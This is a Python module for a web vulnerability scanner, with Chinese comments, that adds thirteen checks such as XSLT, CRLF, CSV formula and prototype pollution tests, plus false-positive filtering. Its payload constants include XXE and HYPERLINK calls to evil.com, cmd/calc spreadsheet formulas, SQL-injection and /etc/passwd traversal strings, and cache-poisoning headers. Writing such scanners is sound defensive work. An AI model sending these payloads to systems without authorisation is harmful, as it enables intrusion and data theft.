"""fast_scanner §2.8 P2 净新增 13 类检查 mixin（技术方案 §4 / 产品方案 §2.8.1）。

13 类：XSLT 注入 / CSV 公式注入 / CRLF·响应头注入 / 原型链污染 / HTTP2 专项 /
       HPP 参数污染 / 点击劫持 / CSP 高级绕过 / Web 缓存欺骗·投毒 /
       WebSocket 安全 / SAML 断言 / 子域接管 / 依赖混淆

实现原则：
- 纯 stdlib，复用 self._request / self._build_url / _fp_filters
- 每项检查聚焦核心检测逻辑 + 误报收敛
- 高误报风险项（点击劫持/CSP/HTTP2）仅 header_only 级别，evidence_quality 标记
"""
from __future__ import annotations

import json
import re
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

from core.log import get_logger

from ._fp_filters import (
    _is_business_deny,
    _is_waf_block_page,
    _is_empty_data,
)
from ._models import VulnFinding, ScanTarget

log = get_logger("fast_scanner")


# ============================================================
# 共用常量
# ============================================================
# XSLT 注入 payload：<?xml-stylesheet> 引用外部 XSL 或内嵌恶意转换
XSLT_PAYLOADS = [
    '<?xml-stylesheet type="text/xsl" href="http://evil.com/evil.xsl"?>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
]
# CSV 公式注入：=cmd|' /C calc'!A0 等
CSV_FORMULA_PAYLOADS = [
    "=cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "=HYPERLINK(\"http://evil.com/capture?\",\"click\")",
    "+cmd|' /C calc'!A0",
    "-cmd|' /C calc'!A0",
]
# CRLF 注入 payload：在 header 值中注入 \r\n 伪造响应头
CRLF_PAYLOADS = [
    "\r\nX-Injected: true",
    "%0d%0aX-Injected:true",
    "\r\n\r\n<script>alert(1)</script>",
]
# 原型链污染 payload（JSON __proto__ / constructor.prototype）
PROTO_POLLUTION_PAYLOADS = [
    '{"__proto__":{"isAdmin":true}}',
    '{"constructor":{"prototype":{"isAdmin":true}}}',
]
# HPP 参数污染 payload
HPP_VALUES = ["admin", "admin' OR '1'='1", "../../etc/passwd"]

# 点击劫持判定：缺 X-Frame-Options / CSP frame-ancestors
CLICKJACKING_PROTECT_HEADERS = ("x-frame-options", "content-security-policy")

# CSP 高级绕过特征：unsafe-inline / unsafe-eval / 缺失
CSP_BYPASS_MARKERS = ("unsafe-inline", "unsafe-eval", "http:", "https:", "*")

# WebSocket 升级握手关键字
WS_UPGRADE_HEADERS = ("upgrade", "connection")

# SAML 断言关键字
SAML_RESPONSE_MARKER = "samlresponse"
SAML_ASSERTION_MARKERS = ("<saml:Assertion", "<samlp:Response", "NameID")

# 子域接管判定关键字（CNAME 指向未注册服务的**服务商默认页专属文案**）。
#
# ★ 924 重写（task_1790223312_c75b16）：
#   旧表里混进了 `"404 not found"` 与 `"doesn't exist"` 这类**通用错误页文案**，
#   而目标站自己的 nginx 404 页正文就是 `<title>404 not found</title>` ——
#   于是任何返回 404 的深路径都会被判成 🟠高危「子域接管 body_confirmed」。
#   实测 proven 报告里 V-ORPHAN-4/11/15 三条假高危全部由 `"404 not found"` 命中产生，
#   这个"body_confirmed"标的是 404 页，是完全虚假的强证据。
#
#   新原则：**只保留有服务商辨识度的默认页文案**（零通用词）。
#   形如 `(marker, vendor)`，vendor 用于生成可读的处置建议。
SUBDOMAIN_TAKEOVER_MARKERS: tuple[str, ...] = (
    "there is no app configured",           # Heroku
    "no such bucket",                       # AWS S3 / GCS
    "the specified bucket does not exist",  # AWS S3
    "the requested bucket does not exist",  # AWS S3
    "fastly error",                         # Fastly
    "unknown domain",                       # Fastly / CDN 未绑定域名页
    "this site is not configured",          # 通用托管平台
    "no site configured",                   # 通用托管平台
    "repository not found",                 # GitHub Pages（旧版 404 文案）
)

#: marker → 服务商名（生成处置建议用）
SUBDOMAIN_TAKEOVER_VENDORS: dict[str, str] = {
    "there is no app configured": "Heroku",
    "no such bucket": "AWS S3 / GCS",
    "the specified bucket does not exist": "AWS S3",
    "the requested bucket does not exist": "AWS S3",
    "fastly error": "Fastly",
    "unknown domain": "Fastly / CDN",
    "this site is not configured": "通用托管平台",
    "no site configured": "通用托管平台",
    "repository not found": "GitHub Pages",
}

#: 通用错误页特征 —— 命中即说明这是站点自己的错误页，不构成子域接管证据。
#: 与上面"服务商专属文案"互斥判定，作为第二道保险。
GENERIC_ERROR_PAGE_HINTS: tuple[str, ...] = (
    "404 not found",
    "page not found",
    "not found</title>",
    "the requested url was not found",
)

# 依赖混淆判定：内部包名 + 公网存在
DEP_CONFUSION_PACKAGES = (
    "internal-utils", "company-common", "org-shared",
    "private-lib", "internal-sdk",
)


class _ChecksP2:
    """§2.8 P2 净新增 13 类检查。"""

    # ============================================================
    # 1. XSLT 注入
    # ============================================================
    async def _check_xslt_injection(self, target: ScanTarget) -> list[VulnFinding]:
        """XSLT 注入（CWE-91）：用户输入被嵌入 XSL 模板执行。

        检测：POST XML body / Content-Type: application/xml 参数注入 XSL payload，
        观察响应是否执行转换（含样式标记或外部引用回显）。
        """
        findings = []
        if target.method != "POST" or not target.body:
            return []
        for payload in XSLT_PAYLOADS:
            headers = {**target.auth_headers, **target.headers,
                       "Content-Type": "application/xml"}
            resp = await self._request(
                "POST", target.url, headers=headers, content=payload,
                rule_tag="XSLT", payload_tag="xslt_payload",
            )
            if not resp or _is_waf_block_page(resp):
                continue
            text = resp.text or ""
            # 回显 XSL 标记或执行特征
            if ("xsl:stylesheet" in text or "xml-stylesheet" in text
                    or resp.status_code == 500 and "xslt" in text.lower()):
                findings.append(VulnFinding(
                    vuln_type="XSLT注入", severity="high", url=target.url,
                    method="POST",
                    detail="存在 XSLT 注入（CWE-91），用户输入可被嵌入 XSL 模板执行",
                    evidence=text[:400], payload=payload,
                    fix_suggestion="禁用外部 XSL 引用，对输入做转义，使用安全的 XML 解析配置",
                    evidence_quality="body_confirmed", rule_tag="XSLT",
                ))
                break
        return findings

    # ============================================================
    # 2. CSV 公式注入
    # ============================================================
    async def _check_csv_formula_injection(self, target: ScanTarget) -> list[VulnFinding]:
        """CSV 公式注入（CWE-1236）：导出 CSV 时未转义 =/+/-/@ 开头字段。

        检测：提交公式 payload，观察导出接口响应（Content-Type: text/csv）
        是否原样返回公式。
        """
        findings = []
        for param_name in target.params:
            for payload in CSV_FORMULA_PAYLOADS:
                test_params = dict(target.params)
                test_params[param_name] = payload
                test_url = self._build_url(target.url, test_params)
                resp = await self._request(
                    "GET", test_url,
                    headers={**target.auth_headers, **target.headers},
                    rule_tag="CSVFormula", payload_tag=f"{param_name}=formula",
                )
                if not resp or _is_waf_block_page(resp):
                    continue
                ctype = resp.headers.get("content-type", "").lower()
                text = resp.text or ""
                if ("csv" in ctype or "spreadsheet" in ctype) and payload in text:
                    findings.append(VulnFinding(
                        vuln_type="CSV公式注入", severity="medium", url=target.url,
                        method="GET",
                        detail=f"参数 '{param_name}' 存在 CSV 公式注入（CWE-1236），"
                               "导出内容未转义公式前缀",
                        evidence=text[:400], payload=payload,
                        fix_suggestion="对导出字段加制表符/单引号前缀，或设置单元格格式为文本",
                        evidence_quality="body_confirmed", rule_tag="CSVFormula",
                    ))
                    break
            if findings:
                break
        return findings

    # ============================================================
    # 3. CRLF·响应头注入
    # ============================================================
    async def _check_crlf_injection(self, target: ScanTarget) -> list[VulnFinding]:
        """CRLF / 响应头注入（CWE-113）：用户输入被写入响应头未过滤 \\r\\n。

        检测：在 header 可控参数注入 CRLF，观察响应头是否出现注入的 X-Injected。
        """
        findings = []
        for param_name in target.params:
            for payload in CRLF_PAYLOADS:
                test_params = dict(target.params)
                test_params[param_name] = payload
                test_url = self._build_url(target.url, test_params)
                resp = await self._request(
                    "GET", test_url,
                    headers={**target.auth_headers, **target.headers},
                    rule_tag="CRLF", payload_tag=f"{param_name}=crlf",
                )
                if not resp:
                    continue
                if "x-injected" in {k.lower() for k in resp.headers}:
                    findings.append(VulnFinding(
                        vuln_type="CRLF响应头注入", severity="high", url=target.url,
                        method="GET",
                        detail=f"参数 '{param_name}' 存在 CRLF 响应头注入（CWE-113）",
                        evidence=str(dict(resp.headers))[:400], payload=payload,
                        fix_suggestion="对写入响应头的输入过滤 \\r\\n，使用白名单校验",
                        evidence_quality="header_confirmed", rule_tag="CRLF",
                    ))
                    break
            if findings:
                break
        return findings

    # ============================================================
    # 4. 原型链污染
    # ============================================================
    async def _check_prototype_pollution(self, target: ScanTarget) -> list[VulnFinding]:
        """原型链污染（CWE-1321）：JSON __proto__ / constructor.prototype 注入。

        检测：POST JSON body 注入污染 payload，观察响应是否反映 isAdmin=true
        或后续请求行为变化。
        """
        findings = []
        if target.method != "POST" or not target.body:
            return []
        try:
            json_body = json.loads(target.body)
        except (json.JSONDecodeError, ValueError):
            return []
        if not isinstance(json_body, dict):
            return []
        for payload in PROTO_POLLUTION_PAYLOADS:
            polluted = json.loads(payload)
            test_json = {**json_body, **polluted}
            resp = await self._request(
                "POST", target.url,
                headers={**target.auth_headers, **target.headers,
                         "Content-Type": "application/json"},
                content=json.dumps(test_json, ensure_ascii=False),
                rule_tag="ProtoPoll", payload_tag="proto_pollution",
            )
            if not resp or _is_waf_block_page(resp):
                continue
            text = resp.text or ""
            if "isadmin" in text.lower() or "is_admin" in text.lower():
                findings.append(VulnFinding(
                    vuln_type="原型链污染", severity="high", url=target.url,
                    method="POST",
                    detail="存在原型链污染（CWE-1321），__proto__ 注入可能导致权限提升",
                    evidence=text[:400], payload=payload,
                    fix_suggestion="使用 Object.create(null) 或 Object.freeze，对 JSON 做 schema 校验",
                    evidence_quality="body_confirmed", rule_tag="ProtoPoll",
                ))
                break
        return findings

    # ============================================================
    # 5. HTTP2 专项
    # ============================================================
    async def _check_http2_abuse(self, target: ScanTarget) -> list[VulnFinding]:
        """HTTP/2 专项检测（CWE-444）：HTTP/2 帧滥用（HPACK 投毒 / 伪头注入）。

        纯 stdlib httpx 不支持 HTTP/2 帧级操控，此处检测响应是否支持 h2，
        并对常见 HTTP/2 降级漏洞（如 h2c 明文升级、smuggling）做基础探测。
        evidence_quality=header_only，需人工确认。
        """
        findings = []
        resp = await self._request(
            target.method, target.url,
            headers={**target.auth_headers, **target.headers,
                     "Connection": "Upgrade, HTTP2-Settings",
                     "Upgrade": "h2c"},
            content=target.body, rule_tag="HTTP2", payload_tag="h2c_upgrade",
        )
        if not resp:
            return []
        # 101 Switching Protocols = 支持 h2c 明文升级（潜在 smuggling）
        if resp.status_code == 101:
            findings.append(VulnFinding(
                vuln_type="HTTP/2降级漏洞", severity="medium", url=target.url,
                method=target.method,
                detail="服务器支持 h2c 明文升级，可能存在 HTTP/2 请求走私风险",
                evidence=f"status=101 Upgrade: {resp.headers.get('upgrade','')}",
                payload="h2c upgrade",
                fix_suggestion="禁用明文 h2c，强制 TLS + ALPN h2；校验帧合法性",
                evidence_quality="header_only", rule_tag="HTTP2",
            ))
        return findings

    # ============================================================
    # 6. HPP 参数污染
    # ============================================================
    async def _check_hpp(self, target: ScanTarget) -> list[VulnFinding]:
        """HPP 参数污染（CWE-235）：同名参数多值导致后端解析歧义。

        检测：对关键参数追加第二个值，观察响应是否与单值有显著差异。
        """
        findings = []
        for param_name in list(target.params.keys())[:3]:
            original = target.params[param_name]
            for evil in HPP_VALUES:
                test_params = dict(target.params)
                # httpx 会把 list 值序列化为同名多参数
                test_params[param_name] = [original, evil]
                test_url = self._build_url(target.url, test_params)
                resp = await self._request(
                    "GET", test_url,
                    headers={**target.auth_headers, **target.headers},
                    rule_tag="HPP", payload_tag=f"{param_name}=hpp",
                )
                if not resp or _is_waf_block_page(resp):
                    continue
                # 基线请求
                baseline = await self._request(
                    "GET", self._build_url(target.url, target.params),
                    headers={**target.auth_headers, **target.headers},
                    rule_tag="HPP", payload_tag="baseline",
                )
                if not baseline:
                    continue
                base_text = baseline.text or ""
                test_text = resp.text or ""
                if (resp.status_code != baseline.status_code
                        and not _is_business_deny(test_text)
                        and len(test_text) > 0):
                    findings.append(VulnFinding(
                        vuln_type="HPP参数污染", severity="medium", url=target.url,
                        method="GET",
                        detail=f"参数 '{param_name}' 存在 HPP 参数污染（CWE-235），"
                               "多值解析导致行为异常",
                        evidence=test_text[:300], payload=f"{param_name}={original}&{param_name}={evil}",
                        fix_suggestion="明确同名参数解析策略，取首/末次，拒绝多余值",
                        evidence_quality="body_confirmed", rule_tag="HPP",
                    ))
                    break
            if findings:
                break
        return findings

    # ============================================================
    # 7. 点击劫持
    # ============================================================
    async def _check_clickjacking(self, target: ScanTarget) -> list[VulnFinding]:
        """点击劫持（CWE-1021）：缺 X-Frame-Options / CSP frame-ancestors。

        evidence_quality=header_only，需人工确认页面是否含敏感操作。
        """
        resp = await self._request(
            target.method, target.url,
            headers={**target.auth_headers, **target.headers},
            content=target.body, rule_tag="ClickJack", payload_tag="header_check",
        )
        if not resp:
            return []
        headers_lower = {k.lower() for k in resp.headers}
        has_xfo = any(h in headers_lower for h in ("x-frame-options",))
        csp = resp.headers.get("content-security-policy", "").lower()
        has_frame_ancestors = "frame-ancestors" in csp
        if not has_xfo and not has_frame_ancestors:
            return [VulnFinding(
                vuln_type="点击劫持", severity="low", url=target.url,
                method=target.method,
                detail="响应头缺 X-Frame-Options 和 CSP frame-ancestors，"
                       "可能被嵌入 iframe 造成点击劫持（CWE-1021）",
                evidence=str({k: resp.headers[k] for k in resp.headers
                              if k.lower() in CLICKJACKING_PROTECT_HEADERS}),
                payload="",
                fix_suggestion="添加 X-Frame-Options: DENY/SAMEORIGIN 或 CSP frame-ancestors",
                evidence_quality="header_only", rule_tag="ClickJack",
            )]
        return []

    # ============================================================
    # 8. CSP 高级绕过
    # ============================================================
    async def _check_csp_bypass(self, target: ScanTarget) -> list[VulnFinding]:
        """CSP 高级绕过检测：unsafe-inline / unsafe-eval / 通配符 / 缺失。

        evidence_quality=header_only。
        """
        resp = await self._request(
            target.method, target.url,
            headers={**target.auth_headers, **target.headers},
            content=target.body, rule_tag="CSP", payload_tag="header_check",
        )
        if not resp:
            return []
        csp = resp.headers.get("content-security-policy", "")
        if not csp:
            return [VulnFinding(
                vuln_type="CSP缺失", severity="medium", url=target.url,
                method=target.method,
                detail="响应缺 Content-Security-Policy 头",
                evidence=str(dict(resp.headers)),
                payload="",
                fix_suggestion="配置严格的 CSP，禁用 unsafe-inline/unsafe-eval",
                evidence_quality="header_only", rule_tag="CSP",
            )]
        findings = []
        csp_lower = csp.lower()
        issues = [m for m in CSP_BYPASS_MARKERS if m in csp_lower]
        if issues:
            findings.append(VulnFinding(
                vuln_type="CSP配置缺陷", severity="low", url=target.url,
                method=target.method,
                detail=f"CSP 含可绕过指令: {', '.join(issues)}",
                evidence=csp, payload="",
                fix_suggestion="移除 unsafe-inline/unsafe-eval，使用 nonce/hash",
                evidence_quality="header_only", rule_tag="CSP",
            ))
        return findings

    # ============================================================
    # 9. Web 缓存欺骗·投毒
    # ============================================================
    async def _check_web_cache_poisoning(self, target: ScanTarget) -> list[VulnFinding]:
        """Web 缓存欺骗/投毒（CWE-44）：未缓存键参数污染缓存。

        检测：添加 X-Forwarded-Host 等头，观察响应是否反映并可能被缓存。
        evidence_quality=header_only。
        """
        findings = []
        poison_headers_list = [
            {"X-Forwarded-Host": "evil-cache.com"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
        ]
        for ph in poison_headers_list:
            resp = await self._request(
                target.method, target.url,
                headers={**target.auth_headers, **target.headers, **ph},
                content=target.body, rule_tag="CachePoison",
                payload_tag="cache_header_poison",
            )
            if not resp or _is_waf_block_page(resp):
                continue
            text = resp.text or ""
            if any(v.lower() in text.lower() for v in ph.values()):
                findings.append(VulnFinding(
                    vuln_type="Web缓存投毒", severity="medium", url=target.url,
                    method=target.method,
                    detail=f"响应反映了投毒头 {list(ph.keys())[0]}，"
                           "若该响应被缓存则可造成缓存投毒（CWE-44）",
                    evidence=text[:300], payload=str(ph),
                    fix_suggestion="缓存键包含所有影响响应的头，规范化输入",
                    evidence_quality="header_confirmed", rule_tag="CachePoison",
                ))
                break
        return findings

    # ============================================================
    # 10. WebSocket 安全
    # ============================================================
    async def _check_websocket_security(self, target: ScanTarget) -> list[VulnFinding]:
        """WebSocket 安全检测：跨域 WebSocket（Origin 未校验）+ 明文 ws。

        evidence_quality=header_only。
        """
        findings = []
        # 检测 ws:// 明文链接
        if "ws://" in (target.url or ""):
            findings.append(VulnFinding(
                vuln_type="WebSocket明文传输", severity="medium", url=target.url,
                method=target.method,
                detail="WebSocket 使用明文 ws:// 协议，应使用 wss://",
                evidence=target.url, payload="",
                fix_suggestion="强制使用 wss:// 加密传输",
                evidence_quality="header_only", rule_tag="WS",
            ))
        # 检测 Origin 校验缺失：发送恶意 Origin 观察是否接受握手
        resp = await self._request(
            "GET", target.url,
            headers={**target.auth_headers, **target.headers,
                     "Origin": "http://evil.com",
                     "Upgrade": "websocket",
                     "Connection": "Upgrade",
                     "Sec-WebSocket-Version": "13",
                     "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ=="},
            rule_tag="WS", payload_tag="origin_check",
        )
        if resp and resp.status_code == 101:
            findings.append(VulnFinding(
                vuln_type="WebSocket跨域", severity="medium", url=target.url,
                method="GET",
                detail="WebSocket 握手未校验 Origin，可能被跨域劫持",
                evidence=f"status=101 Sec-WebSocket-Accept: "
                         f"{resp.headers.get('sec-websocket-accept','')}",
                payload="Origin: http://evil.com",
                fix_suggestion="校验 Origin 白名单，使用 CSRF Token",
                evidence_quality="header_confirmed", rule_tag="WS",
            ))
        return findings

    # ============================================================
    # 11. SAML 断言
    # ============================================================
    async def _check_saml_assertion(self, target: ScanTarget) -> list[VulnFinding]:
        """SAML 断言篡改（CWE-287）：XML Signature Wrapping（XSW）。

        检测：若目标含 SAMLResponse，尝试注入额外断言或注释绕过签名验证。
        此处仅检测 SAML 端点存在性并给出人工确认建议。
        """
        findings = []
        url_lower = (target.url or "").lower()
        if SAML_RESPONSE_MARKER not in url_lower and "saml" not in url_lower:
            return []
        resp = await self._request(
            target.method, target.url,
            headers={**target.auth_headers, **target.headers},
            content=target.body, rule_tag="SAML", payload_tag="saml_probe",
        )
        if not resp:
            return []
        text = resp.text or ""
        if any(m in text for m in SAML_ASSERTION_MARKERS):
            findings.append(VulnFinding(
                vuln_type="SAML断言篡改风险", severity="medium", url=target.url,
                method=target.method,
                detail="检测到 SAML 断言端点，需人工验证 XML Signature Wrapping（XSW）"
                       "和注释注入绕过（CWE-287）",
                evidence=text[:400], payload="",
                fix_suggestion="严格校验 SAML 签名，使用单一 Assertion 元素，禁用注释解析",
                evidence_quality="body_confirmed", rule_tag="SAML",
            ))
        return findings

    # ============================================================
    # 12. 子域接管
    # ============================================================
    @staticmethod
    def _is_root_level_url(url: str) -> bool:
        """URL 是否指向**裸域 / 根路径**（子域接管只可能在 host 层成立）。

        子域接管是 DNS/CNAME 层面问题：``sub.example.com`` 的 CNAME 指向了
        某个已下线的第三方服务，于是访问该 host 的**根**会落到服务商默认页。
        它跟"某个深路径返回什么"没有任何关系 ——
        对 ``/audit/x``、``/QueryLogin`` 这类路径做此判定在语义上就是错的。
        """
        try:
            from urllib.parse import urlsplit
            _p = urlsplit(url).path or "/"
        except Exception:
            return False
        return _p in ("", "/")

    async def _check_subdomain_takeover(self, target: ScanTarget) -> list[VulnFinding]:
        """子域接管（CWE-915）：CNAME 指向未注册的第三方服务。

        ★ 924 重写。必须**同时**满足下列全部条件才成立：

        1. **只在裸域 / 根路径判定** —— 深路径直接返回空（子域接管是 host 层问题）；
        2. 响应 ``status_code == 200`` —— 服务商默认页是 200；4xx 是普通错误页；
        3. 命中**服务商专属**默认页文案（``SUBDOMAIN_TAKEOVER_MARKERS``）；
        4. 未命中通用错误页特征（``GENERIC_ERROR_PAGE_HINTS``）—— 第二道保险。

        修掉的真实误报：旧实现只做 `marker in text` 子串匹配，而表里含
        `"404 not found"` —— 目标站自己的 nginx 404 页就长这样，于是
        ``/audit/FinanTransAudit`` 等 404 路径被标 🟠高危「子域接管」
        （proven 报告 V-ORPHAN-4/11/15）。
        """
        # 条件 1：只对裸域 / 根路径判定
        if not self._is_root_level_url(target.url):
            return []

        resp = await self._request(
            target.method, target.url,
            headers={**target.auth_headers, **target.headers},
            content=target.body, rule_tag="SubTake", payload_tag="takeover_probe",
        )
        if not resp:
            return []

        # 条件 2：只认 200
        if getattr(resp, "status_code", 0) != 200:
            return []

        text = (resp.text or "").lower()
        if not text:
            return []

        # 条件 3：命中服务商专属文案
        hit = next((m for m in SUBDOMAIN_TAKEOVER_MARKERS if m in text), None)
        if not hit:
            return []

        # 条件 4：排除"这就是站点自己的通用错误页"
        if any(h in text for h in GENERIC_ERROR_PAGE_HINTS):
            return []

        _vendor = SUBDOMAIN_TAKEOVER_VENDORS.get(hit, "第三方托管服务")
        return [VulnFinding(
            vuln_type="子域接管", severity="high", url=target.url,
            method=target.method,
            detail=f"根路径响应命中 {_vendor} 默认页特征 '{hit}'，"
                   "CNAME 可能指向未注册/已下线的服务（CWE-915）",
            evidence=text[:300], payload="",
            fix_suggestion=f"核对该域名的 CNAME 记录；若指向已释放的 {_vendor} 资源，"
                           "请移除悬空 CNAME 或重新注册该资源",
            evidence_quality="body_confirmed", rule_tag="SubTake",
        )]

    # ============================================================
    # 13. 依赖混淆
    # ============================================================
    async def _check_dependency_confusion(self, target: ScanTarget) -> list[VulnFinding]:
        """依赖混淆（CWE-1357）：内部包名在公网包仓库已被抢注。

        检测：分析响应/配置中的包管理器配置（package.json / pip.conf / go.mod），
        判断是否有内部包名可能被公网抢注。
        evidence_quality=header_only，需人工确认。
        """
        findings = []
        resp = await self._request(
            target.method, target.url,
            headers={**target.auth_headers, **target.headers},
            content=target.body, rule_tag="DepConf", payload_tag="dep_probe",
        )
        if not resp:
            return []
        text = (resp.text or "").lower()
        for pkg in DEP_CONFUSION_PACKAGES:
            if pkg in text:
                findings.append(VulnFinding(
                    vuln_type="依赖混淆风险", severity="medium", url=target.url,
                    method=target.method,
                    detail=f"响应含内部包名 '{pkg}'，需核实是否在公网仓库被抢注（CWE-1357）",
                    evidence=text[:300], payload=pkg,
                    fix_suggestion="使用 scoped 包名，配置私有仓库优先级，保留公网包名占位",
                    evidence_quality="header_only", rule_tag="DepConf",
                ))
                break
        return findings
